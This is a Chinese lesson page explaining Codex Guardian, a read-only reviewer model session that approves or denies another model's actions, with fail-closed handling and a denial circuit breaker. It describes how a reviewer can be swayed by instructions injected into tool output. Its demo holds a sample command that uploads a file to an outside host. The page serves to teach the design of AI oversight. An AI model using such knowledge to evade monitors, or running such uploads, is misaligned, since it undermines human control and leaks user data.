+@keyframes fireGlow{0%{box-shadow:0 0 0 0 rgba(65,75,90,.3)}50%{box-shadow:0 0 20px 6px rgba(65,75,90,.2)}100%{box-shadow:none}}
+@media(prefers-reduced-motion:reduce){.demo,.demo *{transition-duration:0s!important;animation-duration:0s!important}}
+@media(max-width:760px){.lesson{overflow-x:hidden}.compare{grid-template-columns:1fr}.four{grid-template-columns:1fr}.dm-cols{grid-template-columns:1fr}.dm-steps{grid-template-columns:1fr}.dm-fields{grid-template-columns:1fr}.objective{grid-template-columns:1fr}.lesson-header:after{display:none}.demo{padding:18px}.demo-ctrl{width:100%}.demo-ctrl button{flex:1}.dm-body{min-height:0}.visual{padding:14px}.dm-trace li{flex-direction:column;gap:4px}.dm-summary.on{max-height:520px}}
+</style>
+<meta name="description" content="Codex Guardian 用一次锁死的审查会话代替审批弹窗：四步法、失败关闸、超时与拒绝分账，以及按 turn 计数的熔断器">
+<meta name="author" content="洛小山">
+
+
+
+
+
+
+
+
+<meta property="og:site_name" content="xueai.miyang.cn · AI 产品经理培训">
+<meta property="og:locale" content="zh_CN">
+<!--seo:begin--><meta property="og:type" content="article"><meta property="og:title" content="Guardian：让一个模型去审批另一个模型"><meta property="og:description" content="Codex Guardian 用一次锁死的审查会话代替审批弹窗：四步法、失败关闸、超时与拒绝分账，以及按 turn 计数的熔断器"><meta property="og:url" content="https://xueai.miyang.cn/slides/codex-19.html"><meta property="og:image" content="https://xueai.miyang.cn/slides/og/codex-19.jpg"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="630"><meta name="twitter:card" content="summary_large_image"><style>.xa-tldr{margin:18px 0 4px;padding:14px 18px;background:rgba(0,102,255,0.04);border:1px solid rgba(0,102,255,0.16);border-radius:10px}.xa-tldr .xa-tldr-tag{display:block;font-size:11px;font-weight:800;letter-spacing:1px;color:var(--accent,#0066ff);margin-bottom:6px}.xa-tldr p{margin:0;font-size:15px;line-height:1.8;color:var(--text,#1f2937)}</style><style>html.xa-locked .paywall-locked:not(.xa-peek){display:none!important}html.xa-locked .xa-peek{max-height:132px;overflow:hidden;pointer-events:none;user-select:none;-webkit-mask-image:linear-gradient(180deg,#000 0,#000 14%,transparent 94%);mask-image:linear-gradient(180deg,#000 0,#000 14%,transparent 94%)}</style><!--seo:end-->
+<style>body{opacity:1!important;animation:none!important;padding:26px!important;background:#fff!important}.reveal,.fade-in{opacity:1!important;transform:none!important}.lesson-nav,.qr-bar,.xa-watermark,.paywall-mask{display:none!important}.paywall-locked{max-height:none!important;mask-image:none!important;pointer-events:auto!important}@media(max-width:600px){body{padding:18px!important}}@media(prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}</style></head>
+<body>
+<article class="lesson wide">
+  <header class="lesson-header">
+    <div class="kicker"><svg fill="currentColor" fill-rule="evenodd" height="14" style="flex:none;line-height:1;vertical-align:-2px;margin-right:6px" viewBox="0 0 24 24" width="14" xmlns="http://www.w3.org/2000/svg"><path clip-rule="evenodd" d="M8.086.457a6.105 6.105 0 013.046-.415c1.333.153 2.521.72 3.564 1.7a.117.117 0 00.107.029c1.408-.346 2.762-.224 4.061.366l.063.03.154.076c1.357.703 2.33 1.77 2.918 3.198.278.679.418 1.388.421 2.126a5.655 5.655 0 01-.18 1.631.167.167 0 00.04.155 5.982 5.982 0 011.578 2.891c.385 1.901-.01 3.615-1.183 5.14l-.182.22a6.063 6.063 0 01-2.934 1.851.162.162 0 00-.108.102c-.255.736-.511 1.364-.987 1.992-1.199 1.582-2.962 2.462-4.948 2.451-1.583-.008-2.986-.587-4.21-1.736a.145.145 0 00-.14-.032c-.518.167-1.04.191-1.604.185a5.924 5.924 0 01-2.595-.622 6.058 6.058 0 01-2.146-1.781c-.203-.269-.404-.522-.551-.821a7.74 7.74 0 01-.495-1.283 6.11 6.11 0 01-.017-3.064.166.166 0 00.008-.074.115.115 0 00-.037-.064 5.958 5.958 0 01-1.38-2.202 5.196 5.196 0 01-.333-1.589 6.915 6.915 0 01.188-2.132c.45-1.484 1.309-2.648 2.577-3.493.282-.188.55-.334.802-.438.286-.12.573-.22.861-.304a.129.129 0 00.087-.087A6.016 6.016 0 015.635 2.31C6.315 1.464 7.132.846 8.086.457zm-.804 7.85a.848.848 0 00-1.473.842l1.694 2.965-1.688 2.848a.849.849 0 001.46.864l1.94-3.272a.849.849 0 00.007-.854l-1.94-3.393zm5.446 6.24a.849.849 0 000 1.695h4.848a.849.849 0 000-1.696h-4.848z"></path></svg>OpenAI Codex · 代码模式</div>
+    <h1>Guardian：让一个模型去审批另一个模型</h1>
+    <p class="subtitle">审批弹窗多到人开始无脑点同意时，Codex 把决定权交给一次锁死的审查会话。超时、坏 JSON、连续拒绝，各有各的收场。</p>
+  </header><!--seo:begin--><aside class="xa-tldr"><span class="xa-tldr-tag">一句话速览</span><p>四步法、失败关闸、超时与拒绝分账，以及按 turn 计数的熔断器</p></aside><!--seo:end-->  <div class="objective reveal">
+    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="9"></circle><circle cx="12" cy="12" r="4"></circle><path d="M12 3v5M21 12h-5" fill="none"></path></svg>
+    <span><b>课程目标</b>读完能说清三件事。Guardian 只吃被配置点名的 <code>on-request</code> 审批，用一次锁死的模型会话代替用户弹窗。审查材料按不可信证据处理，超时、跑崩、坏 JSON 一律停住动作。明确拒绝才记入熔断器，连拒到阈值就打断当前 turn。</span>
+  </div>
+
+  <div class="sec-label">先玩一遍 · 一条命令进审查台</div>
+  <div class="demo reveal" id="demo-guardian">
+    <div class="demo-top">
+      <div class="demo-title">同一条审批：先走四步，再看熔断器会不会接手</div>
+      <div class="demo-ctrl">
+        <button id="dm-play" type="button"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="6 3 20 12 6 21 6 3" fill="none"></polygon></svg>播放</button>
+        <button id="dm-step" type="button"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 4l10 8-10 8V4z" fill="none"></path><line x1="19" y1="5" x2="19" y2="19"></line></svg>单步</button>
+        <button id="dm-reset" type="button"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 1 0 3-6.7L3 8" fill="none"></path><path d="M3 3v5h5" fill="none"></path></svg>重置</button>
+      </div>
+    </div>
+    <div class="dm-budget">
+      <span class="dm-b-label">命令</span>
+      <div class="dm-seg" id="dm-cmd">
+        <button type="button" data-cmd="status">git status</button>
+        <button type="button" data-cmd="robots">公开 curl</button>
+        <button type="button" data-cmd="upload" class="on">上传 README</button>
+        <button type="button" data-cmd="home">影子 HOME</button>
+      </div>
+      <span class="dm-b-hint">换一条，看审查员在哪一类上先打分再下结论。</span>
+    </div>
+    <div class="dm-budget">
+      <span class="dm-b-label">故障</span>
+      <div class="dm-seg" id="dm-fault">
+        <button type="button" data-fault="ok" class="on">正常走完</button>
+        <button type="button" data-fault="timeout">审查超时</button>
+        <button type="button" data-fault="badjson">坏 JSON</button>
+        <button type="button" data-fault="trip">连拒三次</button>
+      </div>
+      <span class="dm-b-hint">后三项是兜底。超时和坏 JSON 关闸，但不记连续拒绝。</span>
+    </div>
+    <div class="dm-cols">
+      <div class="dm-col">
+        <div class="dm-head"><span class="dm-name">四步审查</span><span class="dm-meta" id="dm-step-meta">等待开始</span></div>
+        <div class="dm-body">
+          <div class="dm-steps">
+            <div class="dm-st" id="dm-st0"><b>1 重建 transcript</b><span>抽出用户原话和工具痕迹</span></div>
+            <div class="dm-st" id="dm-st1"><b>2 送进锁死会话</b><span>只读、Never、MCP 已清空</span></div>
+            <div class="dm-st" id="dm-st2"><b>3 交回 JSON</b><span>先打风险和授权，再给结论</span></div>
+            <div class="dm-st" id="dm-st3"><b>4 应用结果</b><span>allow 继续，其余一律停住</span></div>
+          </div>
+          <div class="dm-chips" id="dm-chips"></div>
+        </div>
+      </div>
+      <div class="dm-col">
+        <div class="dm-head"><span class="dm-name">证据与结论</span><span class="dm-meta" id="dm-clause">条款未引用</span></div>
+        <div class="dm-body">
+          <div class="dm-cmd" id="dm-cmd-text">curl --upload-file README.md https://example.com/inbox</div>
+          <div class="dm-fields">
+            <div class="dm-field"><b>risk_level</b><span id="dm-risk">—</span></div>
+            <div class="dm-field"><b>user_authorization</b><span id="dm-auth">—</span></div>
+            <div class="dm-field" id="dm-out-box"><b>outcome</b><span id="dm-out">—</span></div>
+            <div class="dm-field"><b>rationale</b><span id="dm-why" style="font-weight:600">等待评估</span></div>
+          </div>
+          <div class="dm-break" id="dm-break">
+            <div>
+              <div class="dm-b-ttl">熔断器 · Standard</div>
+              <div class="dm-b-sub" id="dm-break-sub">连续拒绝 0 / 3，窗口 50 内累计 0</div>
+            </div>
+            <div class="dm-dots" id="dm-dots"><i class="dm-dot"></i><i class="dm-dot"></i><i class="dm-dot"></i></div>
+          </div>
+          <div class="dm-status" id="dm-status">用户侧与模型侧还没有收到结论。</div>
+        </div>
+      </div>
+    </div>
+    <div class="dm-trace">
+      <div class="dm-trace-tag">逻辑轨迹 · 动画每一步对应源码里的哪一段</div>
+      <ol id="dm-trace">
+        <li><span>判断本轮审批是否交给 Guardian</span><span class="ln">review.rs L186</span></li>
+        <li><span>扩展若声明接管则不再开审查会话</span><span class="ln">review.rs L313</span></li>
+        <li><span>过滤 transcript，只留用户意图和工具证据</span><span class="ln">prompt.rs L506</span></li>
+        <li><span>按 Full 或 Delta 拼审查材料</span><span class="ln">prompt.rs L89</span></li>
+        <li><span>克隆父配置，锁成只读并写成 Never</span><span class="ln">review_session.rs L1407</span></li>
+        <li><span>trunk 空闲则追加，忙碌则 fork</span><span class="ln">review_session.rs L617</span></li>
+        <li><span>等待 JSON，超时上限 90 秒</span><span class="ln">mod.rs L53</span></li>
+        <li><span>没有合法 JSON 就解析失败，可重试后关闸</span><span class="ln">prompt.rs L714</span></li>
+        <li><span>allow 放行，deny 写上禁止改道的指示</span><span class="ln">review.rs L717</span></li>
+        <li><span>只有显式 Deny 才记入熔断器</span><span class="ln">review.rs L711</span></li>
+        <li><span>达到连续或窗口阈值，就 InterruptTurn</span><span class="ln">mod.rs L176</span></li>
+      </ol>
+    </div>
+    <div class="dm-caption" id="dm-caption"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" fill="none"></path></svg><span id="dm-caption-text">点播放，看一条命令怎么走过四步审查，以及熔断器什么时候接手。</span></div>
+    <div class="dm-summary" id="dm-summary">
+      <div class="dm-s"><b>模型审模型的风险</b>审查员会格式漂移，也会被工具输出里的指示词牵着走。合同要求先打风险和授权，再给出可执行的 allow 或 deny。</div>
+      <div class="dm-s"><b>失败怎么收场</b>超时走 TimedOut，坏 JSON 走 FailedClosed，动作都停住。这两类故障清零连续拒绝计数，避免把基础设施抖动算成模型连续作恶。</div>
+      <div class="dm-s"><b>熔断器接手之后</b>Standard 连续三次明确拒绝就打断当前 turn。后续命令不再开新审查，因为这一轮已经被 abort 掉了。</div>
+    </div>
+    <div class="demo-caption">教学示意：评估字段按 <code>policy.md</code> 的 Outcome rule 推演，用于展示四步法与熔断器的结构差异。逻辑轨迹右侧行号对应 openai/codex 仓库 commit 4f39251a01。</div>
+  </div>
+
+  <div class="sec-label">思路一 · 四步走完，中间态一律关闸</div>
+
+  <div class="q-tag reveal">它解决什么问题</div>
+  <p class="reveal">你开着 Codex 改仓库。模型先跑 <code>git status</code>，再读两个文件，然后要 <code>git push</code>。下一分钟它要 curl，再下一分钟要往 <code>/tmp</code> 写备忘，再下一分钟要删掉那份备忘。弹窗叠弹窗。人开始只看命令头两个词，拇指已经形成肌肉记忆。</p>
+  <p class="reveal">这就是审批疲劳。防线还在，判断已经不在。回路退化成一个总是亮绿灯的按钮。这时如果把自动放行交给刚写出这条命令的主模型，申请人兼审批人。如果失败时放行，超时和坏 JSON 就变成免费通行证。</p>
+
+  <div class="q-tag reveal">思路是什么</div>
+  <p class="reveal">Codex 把该不该自动放行抽成一次专职审查。它不替代沙箱，也不替代网络代理。它只接管一类本来会弹给用户的 <code>on-request</code> 审批。路由很窄：策略必须是 <code>OnRequest</code> 或 <code>Granular</code>，审查员必须是 <code>AutoReview</code>。默认审查员仍是用户。<span class="src-note">出处：<code>codex-rs/core/src/guardian/review.rs</code> 第 186 至 210 行</span></p>
+  <p class="reveal">模块头把四步写死。</p>
+  <div class="four">
+    <article class="reveal"><b>1 重建 transcript</b><p>只留用户原话和近期工具痕迹。合成脚手架、普通 developer 消息丢掉。超长内容打上 truncated 标记。</p></article>
+    <article class="reveal"><b>2 另开审查会话</b><p>克隆父配置，继承已经建好的 managed network 与 allowlist。审查员必须吐出严格 JSON。</p></article>
+    <article class="reveal"><b>3 失败关闸</b><p>超时、跑崩、坏 JSON，执行一律停住。中间态按拒绝处理。</p></article>
+    <article class="reveal"><b>4 只应用明确结论</b><p>合同要的是 allow 或 deny。产品要的是可执行判定。</p></article>
+  </div>
+  <p class="reveal">合同只有四个字段。三个轴的枚举写在协议层的 <code>approvals.rs</code>，不在 <code>protocol.rs</code>。<code>outcome</code> 是唯一必填。低风险允许可以只回 <code>{"outcome":"allow"}</code>，缺省的风险补成 Low，授权补成 Unknown。</p>
+  <div class="source reveal paywall-locked xa-peek">
+    <div class="source-head"><span>codex-rs/core/src/guardian/mod.rs</span><span>第 116 至 123 行</span></div>
+    <pre><code>/// Structured output contract that the guardian reviewer must satisfy.
+#[derive(Debug, Clone, Deserialize, Serialize, PartialEq, Eq)]
+pub(crate) struct GuardianAssessment {
+    pub(crate) risk_level: codex_protocol::protocol::GuardianRiskLevel,
+    pub(crate) user_authorization: codex_protocol::protocol::GuardianUserAuthorization,
+    pub(crate) outcome: GuardianAssessmentOutcome,
+    pub(crate) rationale: String,
+}</code></pre>
+  </div>
+  <div class="snapshot paywall-locked">源码快照说明：依据本地仓库 <code>openai/codex</code>，核对文件 <code>codex-rs/core/src/guardian/mod.rs</code>，commit <code>4f39251a01</code>，核对日期 2026-08-22。<code>GuardianRiskLevel</code>、<code>GuardianUserAuthorization</code>、<code>GuardianAssessmentOutcome</code> 的穷尽枚举在 <code>codex-rs/protocol/src/approvals.rs</code> 第 85 至 109 行。</div>
+  <div class="visual reveal paywall-locked">
+    <svg viewBox="0 0 940 280" role="img" aria-label="Guardian 四步法从送审到关闸或放行">
+      <defs><marker id="arrA" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path d="M0 0L8 4L0 8Z" fill="#414b5a"></path></marker><marker id="arrR" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path d="M0 0L8 4L0 8Z" fill="#dc2626"></path></marker></defs>
+      <rect x="30" y="36" width="150" height="70" rx="12" fill="#eef0f4" stroke="rgba(65,75,90,.4)"></rect>
+      <text x="105" y="68" fill="#262d38" text-anchor="middle" font-size="14" font-weight="700">审批请求</text>
+      <text x="105" y="90" fill="#6b7280" text-anchor="middle" font-size="13">OnRequest</text>
+      <path fill="none" d="M188 71H248" stroke="#414b5a" stroke-width="2" marker-end="url(#arrA)"></path>
+      <rect x="256" y="36" width="170" height="70" rx="12" fill="#eef0f4" stroke="rgba(65,75,90,.4)"></rect>
+      <text x="341" y="68" fill="#262d38" text-anchor="middle" font-size="14" font-weight="700">紧凑 transcript</text>
+      <text x="341" y="90" fill="#6b7280" text-anchor="middle" font-size="13">用户意图加工具证据</text>
+      <path fill="none" d="M434 71H494" stroke="#414b5a" stroke-width="2" marker-end="url(#arrA)"></path>
+      <rect x="502" y="36" width="170" height="70" rx="12" fill="#ffffff" stroke="#414b5a" stroke-width="2"></rect>
+      <text x="587" y="68" fill="#262d38" text-anchor="middle" font-size="14" font-weight="700">锁死审查会话</text>
+      <text x="587" y="90" fill="#6b7280" text-anchor="middle" font-size="13">只读，Never</text>
+      <path fill="none" d="M680 71H740" stroke="#414b5a" stroke-width="2" marker-end="url(#arrA)"></path>
+      <rect x="748" y="36" width="162" height="70" rx="12" fill="#eef0f4" stroke="rgba(65,75,90,.4)"></rect>
+      <text x="829" y="68" fill="#262d38" text-anchor="middle" font-size="14" font-weight="700">严格 JSON</text>
+      <text x="829" y="90" fill="#6b7280" text-anchor="middle" font-size="13">四个字段</text>
+      <path fill="none" d="M829 114V150" stroke="#414b5a" stroke-width="2" marker-end="url(#arrA)"></path>
+      <rect x="680" y="158" width="230" height="70" rx="12" fill="#eef0f4" stroke="rgba(65,75,90,.4)"></rect>
+      <text x="795" y="190" fill="#262d38" text-anchor="middle" font-size="14" font-weight="700">allow 或 deny</text>
+      <text x="795" y="212" fill="#6b7280" text-anchor="middle" font-size="13">只应用明确结论</text>
+      <path fill="none" d="M587 114V150" stroke="#dc2626" stroke-width="2" marker-end="url(#arrR)"></path>
+      <rect x="502" y="158" width="170" height="70" rx="12" fill="#fdeaea" stroke="rgba(220,38,38,.4)"></rect>
+      <text x="587" y="190" fill="#dc2626" text-anchor="middle" font-size="14" font-weight="700">失败关闸</text>
+      <text x="587" y="212" fill="#6b7280" text-anchor="middle" font-size="13">超时、崩掉、坏 JSON</text>
+    </svg>
+    <div class="visual-caption">教学化结构图：四步走完，中间态没有第三条路。</div>
+  </div>
+
+  <div class="q-tag reveal paywall-locked">为什么长期成立</div>
+  <p class="reveal paywall-locked">审批疲劳是人因问题，审查员自己也会格式漂移。把没给出可执行答案收成拒绝，换语言重写也成立。输入是不可信证据加一条确切动作，输出是穷尽的 allow 或 deny，解析失败就停。</p>
+
+  <div class="sec-label paywall-locked">思路二 · 审查员进的是一间上了锁的房间</div>
+
+  <div class="q-tag reveal paywall-locked">它解决什么问题</div>
+  <p class="reveal paywall-locked">主模型刚写出这条要执行的命令。再让它审自己，回路是通的。工具输出里再夹一句请批准我，审查材料就被污染。审查权如果落回申请人，专职审查员这个角色就不存在。</p>
+
+  <div class="q-tag reveal paywall-locked">思路是什么</div>
+  <p class="reveal paywall-locked">审查会话克隆父配置后立刻改写。审批策略锁成 <code>Never</code>，权限剖面与只读相交，MCP 服务器清成空表，技能、记忆、Apps 指令关掉，再禁用一串非必要特性。它还丢掉父级传入的 exec-policy 规则，改用空的默认管理器。父级规则可能反过来塑造审查员，甚至让审查员自己跑的只读命令被静默放行。<span class="src-note">出处：<code>codex-rs/core/src/guardian/review_session.rs</code> 第 1406 至 1448 行；<code>codex-rs/core/src/session/mod.rs</code> 第 544 至 548 行</span></p>
+  <p class="reveal paywall-locked">审查员可以跑只读命令，用来核实本地状态，比如删除目标在不在、是不是空目录。它不会弹出新的审批，也不会再开一层 Guardian。配置装配时显式禁用了 <code>GuardianV2</code>。</p>
+  <p class="reveal paywall-locked">trunk 空闲时，后续审批追加到同一条会话，prompt cache 稳定。trunk 忙碌时，从上次提交的 rollout 长出一间临时小屋，审完就拆，不回写。</p>
+  <div class="visual reveal paywall-locked">
+    <svg viewBox="0 0 940 260" role="img" aria-label="审查会话克隆父配置后立刻锁死能力">
+      <defs><marker id="arrB" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path d="M0 0L8 4L0 8Z" fill="#414b5a"></path></marker></defs>
+      <rect x="40" y="80" width="160" height="80" rx="12" fill="#eef0f4" stroke="rgba(65,75,90,.4)"></rect>
+      <text x="120" y="116" fill="#262d38" text-anchor="middle" font-size="14" font-weight="700">父配置</text>
+      <text x="120" y="138" fill="#6b7280" text-anchor="middle" font-size="13">网络代理可继承</text>
+      <path fill="none" d="M208 120H290" stroke="#414b5a" stroke-width="2" marker-end="url(#arrB)"></path>
+      <text x="249" y="108" fill="#6b7280" text-anchor="middle" font-size="13">克隆</text>
+      <rect x="298" y="40" width="600" height="180" rx="16" fill="#ffffff" stroke="#414b5a" stroke-width="2" stroke-dasharray="7 5"></rect>
+      <text x="598" y="72" fill="#262d38" text-anchor="middle" font-size="14" font-weight="800">审查房间</text>
+      <rect x="330" y="96" width="126" height="86" rx="10" fill="#eef0f4" stroke="rgba(65,75,90,.4)"></rect>
+      <text x="393" y="132" fill="#262d38" text-anchor="middle" font-size="13" font-weight="700">只读沙箱</text>
+      <text x="393" y="154" fill="#6b7280" text-anchor="middle" font-size="12">权限剖面相交</text>
+      <rect x="472" y="96" width="126" height="86" rx="10" fill="#eef0f4" stroke="rgba(65,75,90,.4)"></rect>
+      <text x="535" y="132" fill="#262d38" text-anchor="middle" font-size="13" font-weight="700">Never</text>
+      <text x="535" y="154" fill="#6b7280" text-anchor="middle" font-size="12">不再弹审批</text>
+      <rect x="614" y="96" width="126" height="86" rx="10" fill="#eef0f4" stroke="rgba(65,75,90,.4)"></rect>
+      <text x="677" y="132" fill="#262d38" text-anchor="middle" font-size="13" font-weight="700">MCP 清空</text>
+      <text x="677" y="154" fill="#6b7280" text-anchor="middle" font-size="12">特性一并关掉</text>
+      <rect x="756" y="96" width="118" height="86" rx="10" fill="#eef0f4" stroke="rgba(65,75,90,.4)"></rect>
+      <text x="815" y="132" fill="#262d38" text-anchor="middle" font-size="13" font-weight="700">空 exec-policy</text>
+      <text x="815" y="154" fill="#6b7280" text-anchor="middle" font-size="12">父规则不进来</text>
+    </svg>
+    <div class="visual-caption">教学化结构图：审查员能用的能力被削到只剩只读核实。</div>
+  </div>
+
+  <div class="q-tag reveal paywall-locked">为什么长期成立</div>
+  <p class="reveal paywall-locked">给不受信任的审查权一个尽量小的环境，是安全设计的通用形状。换模型、换提示词、换能力面，该问的还是同一句：审查员到底需要哪几样能力，其余的能不能一样都不给。</p>
+
+  <div class="sec-label paywall-locked">思路三 · 超时和拒绝分账，连续拒绝才拉闸</div>
+
+  <div class="q-tag reveal paywall-locked">它解决什么问题</div>
+  <p class="reveal paywall-locked">审查员和执行模型卡在同一条被拒动作上，人看到的是一轮空转。如果把超时也算进连续拒绝，基础设施抖动会被误判成模型连续作恶。</p>
+
+  <div class="q-tag reveal paywall-locked">思路是什么</div>
+  <p class="reveal paywall-locked">超时走 <code>ReviewDecision::TimedOut</code>，明确拒绝走 <code>Denied</code>。对模型的文案也拆开。超时告诉它不要仅因超时认定不安全，可以再试一次或去问用户。明确拒绝拼上禁止改道绕过的指示，只允许实质更安全的替代，或用户知情后的明确批准。<span class="src-note">出处：<code>codex-rs/protocol/src/protocol.rs</code> 第 3909 至 3910 行；<code>codex-rs/core/src/guardian/review.rs</code> 第 70 至 74 行</span></p>
+  <p class="reveal paywall-locked">熔断器按 turn 记账，窗口长度 50。Standard 的阈值是连续 3 次，或窗口内累计 10 次。CyberModel 紧到第一次拒绝就停。只有评估结果为 Deny 才计入。超时和 fail-closed 走 <code>record_non_denial</code>，连续计数清零。触发后发 <code>GuardianWarning</code>，再 <code>abort_turn_if_active</code>。<span class="src-note">出处：<code>codex-rs/core/src/guardian/mod.rs</code> 第 53 至 59 行、第 157 至 194 行</span></p>
+  <div class="visual reveal paywall-locked">
+    <svg viewBox="0 0 940 260" role="img" aria-label="超时与明确拒绝在熔断器上分账">
+      <defs><marker id="arrC" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path d="M0 0L8 4L0 8Z" fill="#414b5a"></path></marker><marker id="arrD" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path d="M0 0L8 4L0 8Z" fill="#dc2626"></path></marker></defs>
+      <rect x="40" y="40" width="220" height="70" rx="12" fill="#eef0f4" stroke="rgba(65,75,90,.4)"></rect>
+      <text x="150" y="72" fill="#262d38" text-anchor="middle" font-size="14" font-weight="700">allow / 超时 / 坏 JSON</text>
+      <text x="150" y="94" fill="#6b7280" text-anchor="middle" font-size="13">record_non_denial</text>
+      <path fill="none" d="M268 75H350" stroke="#414b5a" stroke-width="2" marker-end="url(#arrC)"></path>
+      <rect x="358" y="40" width="220" height="70" rx="12" fill="#ffffff" stroke="#414b5a" stroke-width="2"></rect>
+      <text x="468" y="72" fill="#262d38" text-anchor="middle" font-size="14" font-weight="700">连续计数清零</text>
+      <text x="468" y="94" fill="#6b7280" text-anchor="middle" font-size="13">窗口里记一次非拒绝</text>
+      <rect x="40" y="150" width="220" height="70" rx="12" fill="#fdeaea" stroke="rgba(220,38,38,.4)"></rect>
+      <text x="150" y="182" fill="#dc2626" text-anchor="middle" font-size="14" font-weight="700">显式 Deny</text>
+      <text x="150" y="204" fill="#6b7280" text-anchor="middle" font-size="13">record_denial</text>
+      <path fill="none" d="M268 185H350" stroke="#dc2626" stroke-width="2" marker-end="url(#arrD)"></path>
+      <rect x="358" y="150" width="220" height="70" rx="12" fill="#eef0f4" stroke="rgba(65,75,90,.4)"></rect>
+      <text x="468" y="182" fill="#262d38" text-anchor="middle" font-size="14" font-weight="700">连续加一</text>
+      <text x="468" y="204" fill="#6b7280" text-anchor="middle" font-size="13">Standard 阈值是 3</text>
+      <path fill="none" d="M586 185H668" stroke="#dc2626" stroke-width="2" marker-end="url(#arrD)"></path>
+      <rect x="676" y="150" width="224" height="70" rx="12" fill="#fdeaea" stroke="rgba(220,38,38,.4)"></rect>
+      <text x="788" y="182" fill="#dc2626" text-anchor="middle" font-size="14" font-weight="700">InterruptTurn</text>
+      <text x="788" y="204" fill="#6b7280" text-anchor="middle" font-size="13">打断当前 turn</text>
+    </svg>
+    <div class="visual-caption">教学化记账图：同一 turn 里，只有明确拒绝会把熔断器往前推一格。</div>
+  </div>
+  <div class="key-line reveal paywall-locked">失败时关闸。明确拒绝才记一笔。</div>
+
+  <div class="q-tag reveal paywall-locked">为什么长期成立</div>
+  <p class="reveal paywall-locked">安全闸门需要把没做完和明确说不分开记账。混成一句没通过，会把瞬时故障训练成绕过行为。按 turn 计数、按窗口计数，两套阈值即可。面向高对抗场景的策略可以紧到第一次拒绝就停。</p>
+
+  <div class="sec-label paywall-locked">横向对比 · 决定权放在哪</div>
+  <div class="compare paywall-locked">
+    <div class="cmp-card reveal">
+      <h4><svg fill="currentColor" fill-rule="evenodd" height="16" style="flex:none;line-height:1" viewBox="0 0 24 24" width="16" xmlns="http://www.w3.org/2000/svg"><path d="M23.748 4.482c-.254-.124-.364.113-.512.234-.051.039-.094.09-.137.136-.372.397-.806.657-1.373.626-.829-.046-1.537.214-2.163.848-.133-.782-.575-1.248-1.247-1.548-.352-.156-.708-.311-.955-.65-.172-.241-.219-.51-.305-.584-.055-.16-.11-.323-.293-.35-.2-.031-.278.136-.356.276-.313.572-.434 1.202-.422 1.84.027 1.436.633 2.58 1.838 3.393.137.093.172.187.129.323-.082.28-.18.552-.266.833-.055.179-.137.217-.329.14a5.526 5.526 0 01-1.736-1.18c-.857-.828-1.631-1.742-2.597-2.458a11.365 11.365 0 00-.689-.471c-.985-.957.13-1.743.388-1.836.27-.098.093-.432-.779-.428-.872.004-1.67.295-2.687.684a3.055 3.055 0 01-.465.137 9.597 9.597 0 00-2.883-.102c-1.885.21-3.39 1.102-4.497 2.623C.082 8.606-.231 10.684.152 12.85c.403 2.284 1.569 4.175 3.36 5.653 1.858 1.533 3.997 2.284 6.438 2.14 1.482-.085 3.133-.284 4.994-1.86.47.234.962.327 1.78.397.63.059 1.236-.03 1.705-.128.735-.156.684-.837.419-.961-2.155-1.004-1.682-.595-2.113-.926 1.096-1.296 2.746-2.642 3.392-7.003.05-.347.007-.565 0-.845-.004-.17.035-.237.23-.256a4.173 4.173 0 001.545-.475c1.396-.763 1.96-2.015 2.093-3.517.02-.23-.004-.467-.247-.588zM11.581 18c-2.089-1.642-3.102-2.183-3.52-2.16-.392.024-.321.471-.235.763.09.288.207.486.371.739.114.167.192.416-.113.603-.673.416-1.842-.14-1.897-.167-1.361-.802-2.5-1.86-3.301-3.307-.774-1.393-1.224-2.887-1.298-4.482-.02-.386.093-.522.477-.592a4.696 4.696 0 011.529-.039c2.132.312 3.946 1.265 5.468 2.774.868.86 1.525 1.887 2.202 2.891.72 1.066 1.494 2.082 2.48 2.914.348.292.625.514.891.677-.802.09-2.14.11-3.054-.614zm1-6.44a.306.306 0 01.415-.287.302.302 0 01.2.288.306.306 0 01-.31.307.303.303 0 01-.304-.308zm3.11 1.596c-.2.081-.399.151-.59.16a1.245 1.245 0 01-.798-.254c-.274-.23-.47-.358-.552-.758a1.73 1.73 0 01.016-.588c.07-.327-.008-.537-.239-.727-.187-.156-.426-.199-.688-.199a.559.559 0 01-.254-.078c-.11-.054-.2-.19-.114-.358.028-.054.16-.186.192-.21.356-.202.767-.136 1.146.016.352.144.618.408 1.001.782.391.451.462.576.685.914.176.265.336.537.445.848.067.195-.019.354-.25.452z"></path></svg>DeepSeek Harness：两个旋钮，决定权留在人</h4>
+      <p>在 DSH 仓库里检索 reviewer、guardian、auto-approve，没有独立审查会话这种实现。它把同一问题收成两个旋钮。审批策略只有 <code>ask</code> 和 <code>never</code>。<code>ask</code> 把问题交给 answerer 链，链上没人接就 <code>unavailable</code>，调用方 fail closed。<code>never</code> 直接 <code>rejected</code>。授权粒度是一次性的 <code>allowed-once</code>。</p>
+      <p>DSH 可以没有 Guardian，因为它把谁来审固定成人，再用预设降低切换成本。代价是审批疲劳原样存在。<code>ask</code> 模式下弹窗仍然全数到达用户，<code>never</code> 则把判断权整段关掉。</p>
+      <span class="cmp-tag">已核对 user-approval 与 permission-presets · 2026-08-22 · <a href="/dashboard/learning?lesson=dsh-15" data-lesson-id="dsh-15">DSH · 审批与权限</a></span>
+    </div>
+    <div class="cmp-card reveal">
